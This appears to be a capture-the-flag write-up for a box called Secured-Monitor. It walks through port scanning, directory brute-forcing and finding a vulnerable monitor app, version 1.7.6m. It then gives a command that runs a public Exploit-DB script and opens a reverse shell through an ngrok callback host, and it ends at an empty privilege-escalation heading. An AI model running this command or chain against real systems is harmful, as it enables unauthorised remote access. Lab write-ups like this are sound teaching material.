## Welcome to Secured-Monitor Solution

After pasting the 3 flags you had got the IP of the box i.e. `100.27.12.78`

### Recon

Lets get started with nmap as always and we get port 80 open thats great!

![Port Scan](https://i.ibb.co/6RvyYyD/portscan.jpg)

Now lets go to `http://100.27.12.78/` we see a default ubuntu page!

![Default Ubuntu Page](https://i.ibb.co/DLbXPPq/default-ubuntu.jpg)

We have a /robots.txt but thats useless.

Dirbuster it 

![Dirburst](https://i.ibb.co/5spR4MY/dirblast.jpg)

and we get a juicy file at `http://100.27.12.78/monitor/`

![Monitor Page](https://i.ibb.co/jMbv3JP/monitor1.jpg)

At the end we see there is a version `1.7.6m` and a login page!

The version that made me trigger that its not custom made lets google about it!

We find something interesting!

![ExploitDB](https://i.ibb.co/rb7HnWP/exploitdb.jpg)

lets run it :3 with netcat and ngrok (incase if you dont have)

### Exploitation

Run the python exploit which we have got from `https://www.exploit-db.com/exploits/48980`

##Command to run

`python expl.py http://100.27.12.78/monitor/ 2.tcp.ngrok.io 10090`

In the netcat we get a reverse shell :3

![Rev SHell](https://i.ibb.co/mzJVYnv/reverse-shell.jpg)

On crawling around the server we find that the `root.txt` but we cannot read it as we are `www-data`


# Privelege Escalation








